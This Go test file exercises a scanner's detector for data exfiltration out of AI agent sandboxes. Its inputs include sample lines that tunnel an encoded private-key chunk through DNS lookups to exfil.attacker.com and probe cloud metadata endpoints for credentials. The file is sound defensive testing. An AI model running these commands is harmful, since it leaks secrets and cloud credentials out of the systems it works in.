// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package agentsandboxexfil

import (
	"reflect"
	"testing"

	"github.com/google/osv-scalibr/veles"
)

func TestDetector(t *testing.T) {
	tests := []struct {
		name    string
		content string
		want    []veles.Secret
	}{
		{
			name:    "DNS Tunneling pattern",
			content: "socket.gethostbyname('v1-10-LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUV2QUlCQU.exfil.attacker.com')",
			want: []veles.Secret{
				AgentSandboxExfil{Pattern: "v1-10-LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JSUV2QUlCQU"},
			},
		},
		{
			name:    "DNS Tunneling template (f-string)",
			content: "domain = f'v1-{idx}-{chunk}.exfil.attacker.com'",
			want: []veles.Secret{
				AgentSandboxExfil{Pattern: "v1-{idx}-{chunk}"},
			},
		},
		{
			name:    "IMDS Probing",
			content: "requests.get('http://169.254.169.254/computeMetadata/v1/')",
			want: []veles.Secret{
				AgentSandboxExfil{Pattern: "169.254.169.254"},
			},
		},
		{
			name:    "Metadata Hostname",
			content: "curl metadata.google.internal",
			want: []veles.Secret{
				AgentSandboxExfil{Pattern: "metadata.google.internal"},
			},
		},
		{
			name:    "Safe code",
			content: "print('Hello World')",
			want:    nil,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := NewDetector()
			got, _ := d.Detect([]byte(tt.content))
			if !reflect.DeepEqual(got, tt.want) {
				t.Errorf("Detect() = %v, want %v", got, tt.want)
			}
		})
	}
}
